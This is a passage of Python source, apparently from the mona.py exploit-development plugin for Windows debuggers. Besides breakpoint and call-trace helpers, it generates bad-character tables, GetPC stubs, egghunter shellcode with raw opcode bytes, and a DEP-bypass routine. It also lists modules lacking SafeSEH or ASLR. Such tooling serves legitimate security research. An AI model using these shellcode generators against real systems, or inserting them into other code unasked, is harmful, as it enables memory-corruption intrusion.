                result = toHex((4294967296 - ndiff))
                negjmpbytes = ((((((((((('\\x' + result[6]) + result[7]) + '\\x') + result[4]) + result[5]) + '\\x') + result[2]) + result[3]) + '\\x') + result[0]) + result[1])
                regaction = 'sub'
            dbg.log(('Offset from 0x%08x to 0x%08x : %d (0x%s) bytes' % (a1, a2, diff, result)))
            if (a1 > a2):
                dbg.log(('Negative jmp offset : %s' % negjmpbytes))
            else:
                dbg.log(('Jmp offset : %s' % negjmpbytes))
            return

        def procBp(args):
            isReg_a = False
            regs = dbg.getRegs()
            thistype = ''
            if ('a' not in args):
                dbg.log('Missing mandatory argument -a address', highlight=1)
                dbg.log('The address can be an absolute address, a register, or a modulename!functionname')
                return
            a = str(args['a'])
            for reg in regs:
                if (reg.upper() == a.upper()):
                    a = toHex(regs[reg])
                    isReg_a = True
                    break
            a = a.upper().replace('0X', '').lower()
            if (not isAddress(str(a))):
                if (str(a).find('!') > (- 1)):
                    modparts = str(a).split('!')
                    modname = modparts[0]
                    if (not modname.lower().endswith('.dll')):
                        modname += '.dll'
                    themodule = MnModule(modname)
                    if ((themodule != None) and (len(modparts) > 1)):
                        eatlist = themodule.getEAT()
                        funcname = modparts[1].lower()
                        addyfound = False
                        for eatentry in eatlist:
                            if (eatlist[eatentry].lower() == funcname):
                                a = ('%08x' % eatentry)
                                addyfound = True
                                break
                        if (not addyfound):
                            if (__DEBUGGERAPP__ == 'WinDBG'):
                                symboladdress = dbg.resolveSymbol(a)
                                if (symboladdress != ''):
                                    a = symboladdress
                                    addyfound = True
                        if (not addyfound):
                            dbg.log('Please specify a valid address/register/modulename!functionname (-a)', highlight=1)
                            return
                    else:
                        dbg.log('Please specify a valid address/register/modulename!functionname (-a)', highlight=1)
                        return
                else:
                    dbg.log('Please specify a valid address/register/modulename!functionname (-a)', highlight=1)
                    return
            valid_types = ['READ', 'WRITE', 'SFX', 'EXEC']
            if ('t' not in args):
                dbg.log('Missing mandatory argument -t type', highlight=1)
                dbg.log(('Valid types are: %s' % ', '.join(valid_types)))
                return
            else:
                thistype = args['t'].upper()
            if (not (thistype in valid_types)):
                dbg.log(('Invalid type : %s' % thistype))
                return
            if (thistype == 'EXEC'):
                thistype = 'SFX'
            a = hexStrToInt(a)
            dbg.setMemBreakpoint(a, thistype[0])
            dbg.log(('Breakpoint set on %s of 0x%s' % (thistype, toHex(a))), highlight=1)

        def procCallTrace(args):
            modulecriteria = {}
            criteria = {}
            criteria['accesslevel'] = 'X'
            (modulecriteria, criteria) = args2criteria(args, modulecriteria, criteria)
            modulestosearch = getModulesToQuery(modulecriteria)
            hooks = []
            rethooks = []
            showargs = 0
            hookrets = False
            if (not ('m' in args)):
                dbg.log(' ** Please specify what module(s) you want to include in the trace, using argument -m **', highlight=1)
                return
            if ('a' in args):
                if (args['a'] != ''):
                    try:
                        showargs = int(args['a'])
                    except:
                        showargs = 0
            if ('r' in args):
                hookrets = True
            toignore = []
            limit_scope = True
            if (not ('all' in args)):
                toignore.append('PeekMessage')
                toignore.append('GetParent')
                toignore.append('GetFocus')
                toignore.append('EnterCritical')
                toignore.append('LeaveCritical')
                toignore.append('GetWindow')
                toignore.append('CallnextHook')
                toignore.append('TlsGetValue')
                toignore.append('DefWindowProc')
                toignore.append('SetTextColor')
                toignore.append('DrawText')
                toignore.append('TranslateAccel')
                toignore.append('TranslateMessage')
                toignore.append('DispatchMessage')
                toignore.append('isChild')
                toignore.append('GetSysColor')
                toignore.append('SetBkColor')
                toignore.append('GetDlgCtrl')
                toignore.append('CallWindowProc')
                toignore.append('HideCaret')
                toignore.append('MessageBeep')
                toignore.append('SetWindowText')
                toignore.append('GetDlgItem')
                toignore.append('SetFocus')
                toignore.append('SetCursor')
                toignore.append('LoadCursor')
                toignore.append('SetEvent')
                toignore.append('SetDlgItem')
                toignore.append('SetWindowPos')
                toignore.append('GetDC')
                toignore.append('ReleaseDC')
                toignore.append('GetDeviceCaps')
                toignore.append('GetClientRect')
                toignore.append('etLastError')
            else:
                limit_scope = False
            if (len(modulestosearch) > 0):
                dbg.log('[+] Initializing log file')
                logfile = MnLog('calltrace.txt')
                thislog = logfile.reset()
                dbg.log(('[+] Number of CALL arguments to display : %d' % showargs))
                dbg.log('[+] Finding instructions & placing hooks')
                for thismod in modulestosearch:
                    dbg.updateLog()
                    objMod = dbg.getModule(thismod)
                    if (not objMod.isAnalysed):
                        dbg.log('    Analysing code...')
                        objMod.Analyse()
                    themod = MnModule(thismod)
                    modcodebase = themod.moduleCodebase
                    modcodetop = themod.moduleCodetop
                    dbg.setStatusBar(('Placing hooks in %s...' % thismod))
                    dbg.log(('    * %s (0x%08x - 0x%08x)' % (thismod, modcodebase, modcodetop)))
                    ccnt = 0
                    rcnt = 0
                    thisaddr = modcodebase
                    allfuncs = dbg.getAllFunctions(modcodebase)
                    for func in allfuncs:
                        thisaddr = func
                        thisfunc = dbg.getFunction(thisaddr)
                        instrcnt = 0
                        while thisfunc.hasAddress(thisaddr):
                            try:
                                if (instrcnt == 0):
                                    thisopcode = dbg.disasm(thisaddr)
                                else:
                                    thisopcode = dbg.disasmForward(thisaddr, 1)
                                    thisaddr = thisopcode.getAddress()
                                instruction = getDisasmInstruction(thisopcode)
                                if instruction.startswith('CALL '):
                                    ignore_this_instruction = False
                                    for ignores in toignore:
                                        if (instruction.lower().find(ignores.lower()) > (- 1)):
                                            ignore_this_instruction = True
                                            break
                                    if (not ignore_this_instruction):
                                        if (not (thisaddr in hooks)):
                                            hooks.append(thisaddr)
                                            myhook = MnCallTraceHook(thisaddr, showargs, instruction, thislog)
                                            myhook.add(('HOOK_CT_%s' % thisaddr), thisaddr)
                                    ccnt += 1
                                if (hookrets and instruction.startswith('RETN')):
                                    if (not (thisaddr in rethooks)):
                                        rethooks.append(thisaddr)
                                        myhook = MnCallTraceHook(thisaddr, showargs, instruction, thislog)
                                        myhook.add(('HOOK_CT_%s' % thisaddr), thisaddr)
                            except:
                                break
                            instrcnt += 1
                dbg.log(('[+] Total number of CALL hooks placed : %d' % len(hooks)))
                if hookrets:
                    dbg.log(('[+] Total number of RETN hooks placed : %d' % len(rethooks)))
            else:
                dbg.log('[!] No modules selected or found', highlight=1)
            return 'Done'

        def procBu(args):
            if (not ('a' in args)):
                dbg.log('No targets defined. (-a)', highlight=1)
                return
            else:
                allargs = args['a']
                bpargs = allargs.split(',')
                breakpoints = {}
                dbg.log('')
                dbg.log(('Received %d addresses//functions to process' % len(bpargs)))
                for tbparg in bpargs:
                    bparg = tbparg.replace(' ', '')
                    if (bparg.find('.') > (- 1)):
                        functionaddress = dbg.getAddress(bparg)
                        if (functionaddress > 0):
                            dbg.setBreakpoint(functionaddress)
                            breakpoints[bparg] = True
                            dbg.log(('Breakpoint set at 0x%08x (%s), was already mapped' % (functionaddress, bparg)), highlight=1)
                        else:
                            breakpoints[bparg] = False
                    elif (bparg.find('+') > (- 1)):
                        ptrparts = bparg.split('+')
                        modname = ptrparts[0]
                        if (not modname.lower().endswith('.dll')):
                            modname += '.dll'
                        themodule = getModuleObj(modname)
                        if ((themodule != None) and (len(ptrparts) > 1)):
                            address = (themodule.getBase() + int(ptrparts[1], 16))
                            if (address > 0):
                                dbg.log(('Breakpoint set at %s (0x%08x), was already mapped' % (bparg, address)), highlight=1)
                                dbg.setBreakpoint(address)
                                breakpoints[bparg] = True
                            else:
                                breakpoints[bparg] = False
                        else:
                            breakpoints[bparg] = False
                    if ((bparg.find('.') == (- 1)) and (bparg.find('+') == (- 1))):
                        address = (- 1)
                        try:
                            address = int(bparg, 16)
                        except:
                            pass
                        thispage = dbg.getMemoryPageByAddress(address)
                        if (thispage != None):
                            dbg.setBreakpoint(address)
                            dbg.log(('Breakpoint set at 0x%08x, was already mapped' % address), highlight=1)
                            breakpoints[bparg] = True
                        else:
                            breakpoints[bparg] = False
                loadlibraryA = dbg.getAddress('kernel32.LoadLibraryA')
                loadlibraryW = dbg.getAddress('kernel32.LoadLibraryW')
                if ((loadlibraryA > 0) and (loadlibraryW > 0)):
                    endAfound = False
                    endWfound = False
                    cnt = 1
                    while (not endAfound):
                        objInstr = dbg.disasmForward(loadlibraryA, cnt)
                        strInstr = getDisasmInstruction(objInstr)
                        if strInstr.startswith('RETN'):
                            endAfound = True
                            loadlibraryA = objInstr.getAddress()
                        cnt += 1
                    cnt = 1
                    while (not endWfound):
                        objInstr = dbg.disasmForward(loadlibraryW, cnt)
                        strInstr = getDisasmInstruction(objInstr)
                        if strInstr.startswith('RETN'):
                            endWfound = True
                            loadlibraryW = objInstr.getAddress()
                        cnt += 1
                    hooksplaced = False
                    for bptarget in breakpoints:
                        if (not breakpoints[bptarget]):
                            myhookA = MnDeferredHook(loadlibraryA, bptarget)
                            myhookA.add(('HOOK_A_%s' % bptarget), loadlibraryA)
                            myhookW = MnDeferredHook(loadlibraryW, bptarget)
                            myhookW.add(('HOOK_W_%s' % bptarget), loadlibraryW)
                            dbg.log(('Hooks for %s installed' % bptarget))
                            hooksplaced = True
                    if (not hooksplaced):
                        dbg.log('No hooks placed')
                else:
                    dbg.log('** Unable to place hooks, make sure kernel32.dll is loaded', highlight=1)
                return 'Done'

        def procBf(args):
            funcfilter = ''
            mode = ''
            type = 'export'
            modes = ['add', 'del', 'list']
            types = ['import', 'export', 'iat', 'eat']
            modulecriteria = {}
            criteria = {}
            (modulecriteria, criteria) = args2criteria(args, modulecriteria, criteria)
            if ('s' in args):
                try:
                    funcfilter = args['s'].lower()
                except:
                    dbg.log('No functions selected. (-s)', highlight=1)
                    return
            else:
                dbg.log('No functions selected. (-s)', highlight=1)
                return
            if ('t' in args):
                try:
                    mode = args['t'].lower()
                except:
                    pass
            if ('f' in args):
                try:
                    type = args['f'].lower()
                except:
                    pass
            if (not (type in types)):
                dbg.log('No valid function type selected (-f <import|export>)', highlight=1)
                return
            if ((not (mode in modes)) or (mode == '')):
                dbg.log('No valid action defined. (-t add|del|list)')
            doManageBpOnFunc(modulecriteria, criteria, funcfilter, mode, type)
            return

        def procModInfoS(args):
            modulecriteria = {}
            criteria = {}
            modulecriteria['safeseh'] = False
            dbg.log('Safeseh unprotected modules :')
            modulestosearch = getModulesToQuery(modulecriteria)
            showModuleTable('', modulestosearch)
            return

        def procModInfoSA(args):
            modulecriteria = {}
            criteria = {}
            modulecriteria['safeseh'] = False
            modulecriteria['aslr'] = False
            modulecriteria['rebase'] = False
            dbg.log('Safeseh unprotected, no aslr & no rebase modules :')
            modulestosearch = getModulesToQuery(modulecriteria)
            showModuleTable('', modulestosearch)
            return

        def procModInfoA(args):
            modulecriteria = {}
            criteria = {}
            modulecriteria['aslr'] = False
            modulecriteria['rebase'] = False
            dbg.log('No aslr & no rebase modules :')
            modulestosearch = getModulesToQuery(modulecriteria)
            showModuleTable('', modulestosearch)
            return

        def procByteArray(args):
            badchars = ''
            bytesperline = 32
            startval = 0
            endval = 255
            if ('r' in args):
                startval = 255
                endval = 0
            if ('s' in args):
                startval = hex2int(cleanHex(args['s']))
            if ('e' in args):
                endval = hex2int(cleanHex(args['e']))
            if ('b' in args):
                dbg.log(' *** Note: parameter -b has been deprecated and replaced with -cpb ***')
                if (type(args['b']).__name__.lower() != 'bool'):
                    if (not ('cpb' in args)):
                        args['cpb'] = args['b']
            if ('cpb' in args):
                badchars = args['cpb']
            badchars = cleanHex(badchars)
            bpos = 0
            newbadchars = ''
            while (bpos < len(badchars)):
                curchar = (badchars[bpos] + badchars[(bpos + 1)])
                if (curchar == '..'):
                    pos = bpos
                    if ((pos > 1) and (pos <= (len(badchars) - 4))):
                        bytebefore = (badchars[(pos - 2)] + badchars[(pos - 1)])
                        byteafter = (badchars[(pos + 2)] + badchars[(pos + 3)])
                        bbefore = int(bytebefore, 16)
                        bafter = int(byteafter, 16)
                        insertbytes = ''
                        bbefore += 1
                        while (bbefore < bafter):
                            insertbytes += ('%02x' % bbefore)
                            bbefore += 1
                        newbadchars += insertbytes
                else:
                    newbadchars += curchar
                bpos += 2
            badchars = newbadchars
            cnt = 0
            strb = ''
            while (cnt < len(badchars)):
                strb = (strb + binascii.a2b_hex((badchars[cnt] + badchars[(cnt + 1)])))
                cnt = (cnt + 2)
            dbg.log(('Generating table, excluding %d bad chars...' % len(strb)))
            arraytable = []
            binarray = ''
            if (endval > startval):
                increment = 1
                endval += 1
            else:
                endval += (- 1)
                increment = (- 1)
            for thisval in range(startval, endval, increment):
                hexbyte = hex(thisval)[2:]
                binbyte = hex2bin(toHexByte(thisval))
                if (len(hexbyte) == 1):
                    hexbyte = ('0' + hexbyte)
                hexbyte2 = binascii.a2b_hex(hexbyte)
                if (not (hexbyte2 in strb)):
                    arraytable.append(hexbyte)
                    binarray += binbyte
            dbg.log('Dumping table to file')
            output = ''
            cnt = 0
            outputline = '"'
            totalbytes = len(arraytable)
            tablecnt = 0
            while (tablecnt < totalbytes):
                if (cnt < bytesperline):
                    outputline += ('\\x' + arraytable[tablecnt])
                else:
                    outputline += '"\n'
                    cnt = 0
                    output += outputline
                    outputline = ('"\\x' + arraytable[tablecnt])
                tablecnt += 1
                cnt += 1
            if ((cnt - 1) < bytesperline):
                outputline += '"\n'
            output += outputline
            global ignoremodules
            ignoremodules = True
            arrayfilename = 'bytearray.txt'
            objarrayfile = MnLog(arrayfilename)
            arrayfile = objarrayfile.reset()
            binfilename = arrayfile.replace('bytearray.txt', 'bytearray.bin')
            objarrayfile.write(output, arrayfile)
            ignoremodules = False
            dbg.logLines(output)
            dbg.log('')
            binfile = open(binfilename, 'wb')
            binfile.write(binarray)
            binfile.close()
            dbg.log(('Done, wrote %d bytes to file %s' % (len(arraytable), arrayfile)))
            dbg.log(('Binary output saved in %s' % binfilename))
            return

        def procPrintHeader(args):
            alltypes = ['ruby', 'rb', 'python', 'py']
            thistype = 'ruby'
            filename = ''
            typewrong = False
            stopnow = False
            if ('f' in args):
                if (type(args['f']).__name__.lower() != 'bool'):
                    filename = getAbsolutePath(args['f'])
            if ('t' in args):
                if (type(args['t']).__name__.lower() != 'bool'):
                    if (args['t'] in alltypes):
                        thistype = args['t']
                    else:
                        typewrong = True
                else:
                    typewrong = True
            if typewrong:
                dbg.log(('Invalid type specified with option -t. Valid types are: %s' % alltypes), highlight=1)
                stopnow = True
            else:
                if (thistype == 'rb'):
                    thistype = 'ruby'
                if (thistype == 'py'):
                    thistype = 'python'
            if (filename == ''):
                dbg.log('Missing argument -f <source filename>', highlight=1)
                stopnow = True
            if stopnow:
                return
            filename = filename.replace("'", '').replace('"', '')
            content = ''
            try:
                file = open(filename, 'rb')
                content = file.read()
                file.close()
            except:
                dbg.log(('Unable to read file %s' % filename), highlight=1)
                return
            dbg.log(('Read %d bytes from %s' % (len(content), filename)))
            dbg.log(('Output type: %s' % thistype))
            cnt = 0
            linecnt = 0
            output = ''
            thisline = ''
            max = len(content)
            addchar = '<<'
            if (thistype == 'python'):
                addchar = '+='
            output = 'header = ""\n'
            while (cnt < max):
                if (cnt < (max - 1)):
                    thisline = ('header %s "' % addchar)
                    thiscnt = cnt
                    while ((cnt < (max - 1)) and isAscii2(ord(content[cnt])) and (ord(content[(cnt + 1)]) == 0)):
                        if (content[cnt] == '\\'):
                            thisline += '\\'
                        if (content[cnt] == '"'):
                            thisline += '\\'
                        thisline += ('%s\\x00' % content[cnt])
                        cnt += 2
                    if (thiscnt != cnt):
                        output += ((thisline + '"') + '\n')
                        linecnt += 1
                thisline = ('header %s "' % addchar)
                thiscnt = cnt
                reps = 1
                startval = content[cnt]
                if isAscii(ord(content[cnt])):
                    while (cnt < (max - 1)):
                        if (startval == content[(cnt + 1)]):
                            reps += 1
                            cnt += 1
                        else:
                            break
                    if (reps > 1):
                        if (startval == '\\'):
                            startval += '\\'
                        if (startval == '"'):
                            startval = ('\\' + '"')
                        output += ((((thisline + startval) + '" * ') + str(reps)) + '\n')
                        cnt += 1
                        linecnt += 1
                        continue
                thisline = ('header %s "' % addchar)
                thiscnt = cnt
                while ((cnt < max) and isAscii2(ord(content[cnt]))):
                    if ((cnt < (max - 1)) and (ord(content[(cnt + 1)]) == 0)):
                        break
                    if (content[cnt] == '\\'):
                        thisline += '\\'
                    if (content[cnt] == '"'):
                        thisline += '\\'
                    thisline += content[cnt]
                    cnt += 1
                if (thiscnt != cnt):
                    output += ((thisline + '"') + '\n')
                    linecnt += 1
                if (cnt < max):
                    thisline = ('header %s "' % addchar)
                    thiscnt = cnt
                    while (cnt < max):
                        if isAscii2(ord(content[cnt])):
                            break
                        if ((cnt < (max - 1)) and isAscii2(ord(content[cnt])) and (ord(content[(cnt + 1)]) == 0)):
                            break
                        reps = 1
                        startval = ord(content[cnt])
                        while (cnt < (max - 1)):
                            if (startval == ord(content[(cnt + 1)])):
                                reps += 1
                                cnt += 1
                            else:
                                break
                        if (reps > 1):
                            if (len(thisline) > 12):
                                output += ((thisline + '"') + '\n')
                            thisline = ('header %s "\\x' % addchar)
                            thisline += ('%02x" * %d' % (startval, reps))
                            output += (thisline + '\n')
                            thisline = ('header %s "' % addchar)
                            linecnt += 1
                        else:
                            thisline += ('\\x' + ('%02x' % ord(content[cnt])))
                        cnt += 1
                    if (thiscnt != cnt):
                        if (len(thisline) > 12):
                            output += ((thisline + '"') + '\n')
                            linecnt += 1
            global ignoremodules
            ignoremodules = True
            headerfilename = 'header.txt'
            objheaderfile = MnLog(headerfilename)
            headerfile = objheaderfile.reset()
            objheaderfile.write(output, headerfile)
            ignoremodules = False
            if (not silent):
                dbg.log(('-' * 30))
                dbg.logLines(output)
                dbg.log(('-' * 30))
            dbg.log(('Wrote header to %s' % headerfile))
            return

        def procUpdate(args):
            '\n\t\t\tFunction to update mona and optionally windbglib to the latest version\n\t\t\t\n\t\t\tArguments : none\n\t\t\t\n\t\t\tReturns : new version of mona/windbglib (if available)\n\t\t\t'
            updateproto = 'https'
            imversion = __IMM__
            dbg.setStatusBar('Running update process...')
            dbg.updateLog()
            updateurl = 'https://github.com/corelan/mona/raw/master/mona.py'
            (currentversion, currentrevision) = getVersionInfo(inspect.stack()[0][1])
            u = ''
            try:
                u = urllib.urlretrieve(updateurl)
                (newversion, newrevision) = getVersionInfo(u[0])
                if ((newversion != '') and (newrevision != '')):
                    dbg.log('[+] Version compare :')
                    dbg.log(('    Current Version : %s, Current Revision : %s' % (currentversion, currentrevision)))
                    dbg.log(('    Latest Version : %s, Latest Revision : %s' % (newversion, newrevision)))
                else:
                    dbg.log('[-] Unable to check latest version (corrupted file ?), try again later', highlight=1)
                    return
            except:
                dbg.log('[-] Unable to check latest version (download error). Try again later', highlight=1)
                dbg.log("    Meanwhile, please check/confirm that you're running a recent version of python 2.7 (2.7.14 or higher)", highlight=1)
                return
            doupdate = False
            if ((newversion != '') and (newrevision != '')):
                if (currentversion != newversion):
                    doupdate = True
                elif (int(currentrevision) < int(newrevision)):
                    doupdate = True
            if doupdate:
                dbg.log('[+] New version available', highlight=1)
                dbg.log(('    Updating to %s r%s' % (newversion, newrevision)), highlight=1)
                try:
                    shutil.copyfile(u[0], inspect.stack()[0][1])
                    dbg.log('    Done')
                except:
                    dbg.log('    ** Unable to update mona.py', highlight=1)
                (currentversion, currentrevision) = getVersionInfo(inspect.stack()[0][1])
                dbg.log(('[+] Current version : %s r%s' % (currentversion, currentrevision)))
            else:
                dbg.log('[+] You are running the latest version')
            if (__DEBUGGERAPP__ == 'WinDBG'):
                dbg.log('[+] Locating windbglib path')
                paths = sys.path
                filefound = False
                libfile = ''
                for ppath in paths:
                    libfile = (ppath + '\\windbglib.py')
                    if os.path.isfile(libfile):
                        filefound = True
                        break
                if (not filefound):
                    dbg.log('    ** Unable to find windbglib.py ! **')
                else:
                    dbg.log(('[+] Checking if %s needs an update...' % libfile))
                    updateurl = 'https://github.com/corelan/windbglib/raw/master/windbglib.py'
                    (currentversion, currentrevision) = getVersionInfo(libfile)
                    u = ''
                    try:
                        u = urllib.urlretrieve(updateurl)
                        (newversion, newrevision) = getVersionInfo(u[0])
                        if ((newversion != '') and (newrevision != '')):
                            dbg.log('[+] Version compare :')
                            dbg.log(('    Current Version : %s, Current Revision : %s' % (currentversion, currentrevision)))
                            dbg.log(('    Latest Version : %s, Latest Revision : %s' % (newversion, newrevision)))
                        else:
                            dbg.log('[-] Unable to check latest version (corrupted file ?), try again later', highlight=1)
                            return
                    except:
                        dbg.log('[-] Unable to check latest version (download error). Try again later', highlight=1)
                        dbg.log("    Meanwhile, please check/confirm that you're running a recent version of python 2.7 (2.7.14 or higher)", highlight=1)
                        return
                    doupdate = False
                    if ((newversion != '') and (newrevision != '')):
                        if (currentversion != newversion):
                            doupdate = True
                        elif (int(currentrevision) < int(newrevision)):
                            doupdate = True
                    if doupdate:
                        dbg.log('[+] New version available', highlight=1)
                        dbg.log(('    Updating to %s r%s' % (newversion, newrevision)), highlight=1)
                        try:
                            shutil.copyfile(u[0], libfile)
                            dbg.log('    Done')
                        except:
                            dbg.log('    ** Unable to update windbglib.py', highlight=1)
                        (currentversion, currentrevision) = getVersionInfo(libfile)
                        dbg.log(('[+] Current version : %s r%s' % (currentversion, currentrevision)))
                    else:
                        dbg.log('[+] You are running the latest version')
            dbg.setStatusBar('Done.')
            return

        def procgetPC(args):
            r32 = ''
            output = ''
            if ('r' in args):
                if (type(args['r']).__name__.lower() != 'bool'):
                    r32 = args['r'].lower()
            if ((r32 == '') or (not ('r' in args))):
                dbg.log('Missing argument -r <register>', highlight=1)
                return
            opcodes = {}
            opcodes['eax'] = '\\x58'
            opcodes['ecx'] = '\\x59'
            opcodes['edx'] = '\\x5a'
            opcodes['ebx'] = '\\x5b'
            opcodes['esp'] = '\\x5c'
            opcodes['ebp'] = '\\x5d'
            opcodes['esi'] = '\\x5e'
            opcodes['edi'] = '\\x5f'
            calls = {}
            calls['eax'] = '\\xd0'
            calls['ecx'] = '\\xd1'
            calls['edx'] = '\\xd2'
            calls['ebx'] = '\\xd3'
            calls['esp'] = '\\xd4'
            calls['ebp'] = '\\xd5'
            calls['esi'] = '\\xd6'
            calls['edi'] = '\\xd7'
            output = (((((('\n' + r32) + '|  jmp short back:\n"\\xeb\\x03') + opcodes[r32]) + '\\xff') + calls[r32]) + '\\xe8\\xf8\\xff\\xff\\xff"\n')
            output += (((r32 + '|  call + 4:\n"\\xe8\\xff\\xff\\xff\\xff\\xc3') + opcodes[r32]) + '"\n')
            output += (((r32 + '|  fstenv:\n"\\xd9\\xeb\\x9b\\xd9\\x74\\x24\\xf4') + opcodes[r32]) + '"\n')
            global ignoremodules
            ignoremodules = True
            getpcfilename = 'getpc.txt'
            objgetpcfile = MnLog(getpcfilename)
            getpcfile = objgetpcfile.reset()
            objgetpcfile.write(output, getpcfile)
            ignoremodules = False
            dbg.logLines(output)
            dbg.log('')
            dbg.log(('Wrote to file %s' % getpcfile))
            return

        def procEgg(args):
            filename = ''
            egg = 'w00t'
            usechecksum = False
            usewow64 = False
            useboth = False
            egg_size = 0
            win_ver = '10'
            win_vers = ['7', '10']
            checksumbyte = ''
            extratext = ''
            global silent
            oldsilent = silent
            silent = True
            if ('f' in args):
                if (type(args['f']).__name__.lower() != 'bool'):
                    filename = args['f']
            filename = getAbsolutePath(filename.replace("'", '').replace('"', ''))
            if ('winver' in args):
                if (str(args['winver']) in win_vers):
                    win_ver = str(args['winver'])
                else:
                    dbg.log("[-] Didn't recognize windows version, using Win10 as the default", highlight=True)
            if ('t' in args):
                if (type(args['t']).__name__.lower() != 'bool'):
                    egg = args['t']
            if ('wow64' in args):
                usewow64 = True
            if ('both' in args):
                useboth = True
            if (len(egg) != 4):
                egg = 'w00t'
            dbg.log(('[+] Egg set to %s' % egg))
            if ('c' in args):
                if (filename != ''):
                    usechecksum = True
                    dbg.log('[+] Hunter will include checksum routine')
                else:
                    dbg.log('Option -c only works in conjunction with -f <filename>', highlight=1)
                    return
            startreg = ''
            if ('startreg' in args):
                if isReg(args['startreg']):
                    startreg = args['startreg'].lower()
                    dbg.log(('[+] Egg will start search at %s' % startreg))
            depmethods = ['virtualprotect', 'copy', 'copy_size']
            depreg = 'esi'
            depsize = 0
            freeregs = ['ebx', 'ecx', 'ebp', 'esi']
            regsx = {}
            regsx['eax'] = ['f¸', 'fP', '°', '´']
            regsx['ebx'] = ['f»', 'fS', '³', '·']
            regsx['ecx'] = ['f¹', 'fQ', '±', 'µ']
            regsx['edx'] = ['fº', 'fR', '²', '¶']
            regsx['esi'] = ['f¾', 'fV']
            regsx['edi'] = ['f¿', 'fW']
            regsx['ebp'] = ['f½', 'fU']
            regsx['esp'] = ['f¼', 'fT']
            addreg = {}
            addreg['eax'] = '\x83À'
            addreg['ebx'] = '\x83Ã'
            addreg['ecx'] = '\x83Á'
            addreg['edx'] = '\x83Â'
            addreg['esi'] = '\x83Æ'
            addreg['edi'] = '\x83Ç'
            addreg['ebp'] = '\x83Å'
            addreg['esp'] = '\x83Ä'
            depdest = ''
            depmethod = ''
            getpointer = ''
            getsize = ''
            getpc = ''
            jmppayload = 'ÿç'
            if ('depmethod' in args):
                if (args['depmethod'].lower() in depmethods):
                    depmethod = args['depmethod'].lower()
                    dbg.log('[+] Hunter will include routine to bypass DEP on found shellcode')
                if ('depreg' in args):
                    if isReg(args['depreg']):
                        depreg = args['depreg'].lower()
                if ('depdest' in args):
                    if isReg(args['depdest']):
                        depdest = args['depdest'].lower()
                if ('depsize' in args):
                    try:
                        depsize = int(args['depsize'])
                    except:
                        dbg.log(' ** Invalid depsize', highlight=1)
                        return
            data = ''
            if (filename != ''):
                try:
                    f = open(filename, 'rb')
                    data = f.read()
                    f.close()
                    dbg.log(('[+] Read payload file (%d bytes)' % len(data)))
                except:
                    dbg.log(('Unable to read file %s' % filename), highlight=1)
                    return
            egghunter = ''
            if (not usewow64):
                dbg.log('[+] Generating traditional 32bit egghunter code')
                egghunter = ''
                egghunter += (((('f\x81Êÿ\x0f' + 'B') + 'Rj\x02XÍ.<\x05Ztï¸') + egg) + '\x8bú¯uê¯uç')
                incedxoffset = 5
            if usewow64:
                dbg.log(('[+] Generating egghunter for wow64, Windows %s' % win_ver))
                egghunter = ''
                if (win_ver == '7'):
                    egghunter += (('1ÛSSSS³Àf\x81Êÿ\x0fBRj&X3É\x8bÔdÿ\x13^Z<\x05té¸' + egg) + '\x8bú¯uä¯uá')
                    incedxoffset = 13
                elif (win_ver == '10'):
                    egghunter += (('3Òf\x81Êÿ\x0f3ÛBSSRSSSj)X³Àdÿ\x13\x83Ä\x0cZ\x83Ä\x08<\x05tß¸' + egg) + '\x8bú¯uÚ¯u×')
                    incedxoffset = 9
            if usechecksum:
                dbg.log('[+] Generating checksum routine')
                extratext = '+ checksum routine'
                egg_size = ''
                if (len(data) < 256):
                    cmp_reg = '\x80ù'
                    egg_size = hex2bin(('%02x' % len(data)))
                    offset1 = '÷'
                elif (len(data) < 65536):
                    cmp_reg = 'f\x81ù'
                    egg_size_normal = ('%04X' % len(data))
                    while ((egg_size_normal[0:2] == '00') or (egg_size_normal[2:4] == '00')):
                        data += '\x90'
                        egg_size_normal = ('%04X' % len(data))
                    egg_size = (hex2bin(egg_size_normal[2:4]) + hex2bin(egg_size_normal[0:2]))
                    offset1 = 'õ'
                else:
                    dbg.log('Cannot use checksum code with this payload size (way too big)', highlight=1)
                    return
                sum = 0
                for byte in data:
                    sum += ord(byte)
                sumstr = toHex(sum)
                checksumbyte = sumstr[(len(sumstr) - 2):len(sumstr)]
                sizeOfjnzincedx = 2
                sizeOfChecksumRoutine = 15
                offset2 = shortJump(sizeOfjnzincedx, (- ((((len(egghunter) - incedxoffset) + sizeOfChecksumRoutine) + len(cmp_reg)) + len(egg_size))))
                egghunter += (((((((('Q1É1À\x02\x04\x0fA' + cmp_reg) + egg_size) + 'u') + offset1) + ':\x049') + 'Y') + 'u') + offset2)
            if (depmethod != ''):
                dbg.log('[+] Generating dep bypass routine')
                if (not (depreg in freeregs)):
                    getpointer += (((('mov ' + freeregs[0]) + ',') + depreg) + '#')
                    depreg = freeregs[0]
                freeregs.remove(depreg)
                if ((depmethod == 'copy') or (depmethod == 'copy_size')):
                    if (depdest != ''):
                        if (not (depdest in freeregs)):
                            getpointer += (((('mov ' + freeregs[0]) + ',') + depdest) + '#')
                            depdest = freeregs[0]
                    else:
                        getpc = 'Ùî'
                        getpc += 'Ùtäô'
                        depdest = freeregs[0]
                        getpc += hex2bin(assemble(('pop ' + depdest)))
                    freeregs.remove(depdest)
                sizereg = freeregs[0]
                if (depsize == 0):
                    depsize = (len(data) * 2)
                    if (depmethod == 'copy_size'):
                        depsize = len(data)
                if (depsize == 0):
                    dbg.log('** Please specify a valid -depsize when you are not using -f **', highlight=1)
                    return
                elif (depsize <= 127):
                    getsize = ('j' + hex2bin(('\\x' + toHexByte(depsize))))
                elif (depsize <= 65535):
                    sizeparam = toHex(depsize)[4:8]
                    getsize = hex2bin(assemble(((('xor ' + sizereg) + ',') + sizereg)))
                    if (not ((sizeparam[0:2] == '00') or (sizeparam[2:4] == '00'))):
                        getsize += (regsx[sizereg][0] + hex2bin(((('\\x' + sizeparam[2:4]) + '\\x') + sizeparam[0:2])))
                    elif (len(regsx[sizereg]) > 2):
                        if (not (sizeparam[0:2] == '00')):
                            getsize += (regsx[sizereg][3] + hex2bin(('\\x' + sizeparam[0:2])))
                        if (not (sizeparam[2:4] == '00')):
                            getsize += (regsx[sizereg][2] + hex2bin(('\\x' + sizeparam[2:4])))
                    else:
                        blockcnt = 0
                        vpsize = 0
                        blocksize = depsize
                        while (blocksize >= 127):
                            blocksize = (blocksize / 2)
                            blockcnt += 1
                        if (blockcnt > 0):
                            getsize += (addreg[sizereg] + hex2bin(('\\x' + toHexByte(blocksize))))
                            vpsize = blocksize
                            depblockcnt = 0
                            while (depblockcnt < blockcnt):
